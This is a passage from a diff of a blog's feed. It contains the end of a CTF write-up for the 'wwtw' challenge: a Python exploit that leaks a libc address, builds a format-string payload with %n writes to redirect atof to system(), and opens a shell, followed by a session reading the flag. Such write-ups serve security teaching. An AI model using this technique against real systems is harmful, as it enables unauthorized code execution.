+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">][:</span><span class="mi">4</span><span class="p">]</span>
+</span><span class='line'><span class="c">#print len(ret),&quot;read&quot;,hex(struct.unpack(&quot;&lt;I&quot;,ret)[0])</span>
+</span><span class='line'><span class="n">addr_read</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">ret</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">##system addr, the offset is based on the corresponding version of libc</span>
+</span><span class='line'><span class="n">addr_system</span> <span class="o">=</span> <span class="n">addr_read</span> <span class="o">-</span> <span class="mi">633408</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">##write address of system to atof&#39;s relo</span>
+</span><span class='line'><span class="n">relo_atof</span> <span class="o">=</span> <span class="n">base</span><span class="o">+</span><span class="mh">0x5080</span>
+</span><span class='line'><span class="n">str_system</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">addr_system</span><span class="p">)</span>
+</span><span class='line'><span class="n">tmp</span> <span class="o">=</span> <span class="n">str_system</span><span class="p">[:</span><span class="mi">2</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">system1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">str_system</span><span class="p">[:</span><span class="mi">2</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+</span><span class='line'><span class="n">system2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">str_system</span><span class="p">[</span><span class="mi">2</span><span class="p">:][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;Coordinates:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span>  <span class="o">=</span> <span class="s">&quot;51.492137,-0.192878z&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">relo_atof</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">relo_atof</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="c">#can be any random 4 bytes</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">relo_atof</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span> <span class="s">&quot;</span><span class="si">%08x</span><span class="s">.&quot;</span><span class="o">*</span><span class="mi">18</span> <span class="o">+</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">system1</span><span class="o">+</span><span class="mi">186</span><span class="o">-</span><span class="mi">372</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span> <span class="s">&quot;x&quot;</span> <span class="o">+</span> <span class="s">&quot;%n&quot;</span><span class="o">+</span> <span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">system2</span><span class="o">-</span><span class="n">system1</span><span class="p">)</span> <span class="o">+</span><span class="s">&quot;x%n&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span><span class="c">#after this, calling atof() becomes calling system(). we can manually input the command</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<pre><code class="plain">alpha@alpha-th:~$ python wwtw.py
+...
+...
+f774b082 is occupied by another TARDIS.  Materializing there would rip a hole in time and space. Choose again.  
+Coordinates: ,sh
+sh: 1: ,sh: not found
+
+Unauthorized occupant detected...goodbye
+id
+uid=1001(wwtw) gid=1001(wwtw) groups=1001(wwtw)
+cat /home/wwtw/flag
+The flag is: Would you like a Jelly Baby? !@()*ASF)9UW$askjal
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[ASIS CTF Quals 2015 Re100 Tera Writeup]]></title>
